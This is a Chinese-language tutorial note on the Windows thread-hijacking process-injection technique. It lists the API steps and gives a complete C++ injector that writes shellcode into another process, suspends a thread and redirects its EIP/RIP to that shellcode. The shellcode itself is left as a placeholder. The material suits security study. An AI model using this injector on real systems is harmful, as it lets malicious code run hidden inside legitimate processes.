# Thread Hijack
## 简介
过程比较类似Process Hollowing, Process Hollowing是镂空进程. Thread Hijack是挂起目标线程, 修改程序流instruction pointer(RIP/EIP寄存器)指向shellcode空间.  好像是很基本的手段, 确实很朴素, 直接就修改RIP.

在系统调用的中途挂起并恢复线程会**引起系统崩溃**。为了避免这种情况的发生，更复杂的利用技术是，一旦EIP寄存器在`NTDLL.dll`中就恢复并重试。

1. 攻击已存在的process
2. shellcode
3. 无`CreateRemoteThread`

### 过程简介

1. 找到目标进程和线程
2. 往目标进程中写一会儿要跑的shellcode
	* `VirtualAllocEx`
	* `WriteProcessMemory`
3. 挂起目标线程
	* `SuspendThread`
4. 获取目标线程环境
	* `GetThreadContext`
5. 修改线程程序流, 寄存器RIP/EIP的值, point to the shellcode.
	* `Context.Eip= AllocMemory`
	* x64 -> Rip, x86 -> Eip
6. 重新设置环境
	* `SetThreadContext`
7. 唤醒线程
	* `ResumeThread`

## 关键代码注释
太简单了, 就直接贴一下code算了.

```
#include <windows.h>
#include <iostream>
#include <Tlhelp32.h>
#include <vector>
using namespace std;
DWORD GetProcessPid(char *ProcessName);
DWORD GetThreadTid(DWORD Pid);
UCHAR shellcode[] = {....};
int main(int argc, char* arg[])
{
	// 1. get target process
	DWORD Pid = GetProcessPid(arg[1]);
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid);

	// 2. Alloc space and Write shellcode
	LPVOID AllocMemory = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(hProcess, AllocMemory, shellcode, sizeof(shellcode), NULL);
	 
	// 3. suspend thread and getcontext
	DWORD Tid = GetThreadTid(Pid);
	HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, TRUE, Tid);

	cout << "Pid is " << Pid << endl;
	cout << "Tid is " << Tid << endl;

	SuspendThread(hThread);
	CONTEXT lpContext = {0};
	lpContext.ContextFlags = CONTEXT_ALL;
	GetThreadContext(hThread, &lpContext);
	
	//4. change RIP, point to shellcode.
	GetThreadContext(hThread, &lpContext);
	lpContext.Eip = (DWORD_PTR)AllocMemory;	// x64 lpContext.Rip
	SetThreadContext(hThread, &lpContext);
	ResumeThread(hThread);

	cout << "Thread Hijack Successful" << endl;
}


DWORD GetProcessPid(char *ProcessName)
{
	HANDLE hProcessSnap = NULL;   //define snapshot
	DWORD ProcessID = 0;
	PROCESSENTRY32 pe32 = { 0 };
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);   //create snapshot of all process in system
	pe32.dwSize = sizeof(PROCESSENTRY32);
	if (Process32First(hProcessSnap, &pe32))
	{
		do
		{
			if (!strcmp(ProcessName, pe32.szExeFile))
			{
				ProcessID = pe32.th32ProcessID;
				break;
			}
		} while (Process32Next(hProcessSnap, &pe32));
	}
	CloseHandle(hProcessSnap);
	return ProcessID;
}

DWORD GetThreadTid(DWORD Pid)
{
	HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); 
	THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
	HANDLE threadHandle = NULL;
	if (Thread32First(hThreadSnap, &threadEntry)) {
		do {
			if (threadEntry.th32OwnerProcessID == Pid) {
				return threadEntry.th32ThreadID;
			}
		} while (Thread32Next(hThreadSnap, &threadEntry));
	}
}
```

## reference

1. [https://www.ired.team/offensive-security/code-injection-process-injection/injecting-to-remote-process-via-thread-hijacking](https://www.ired.team/offensive-security/code-injection-process-injection/injecting-to-remote-process-via-thread-hijacking)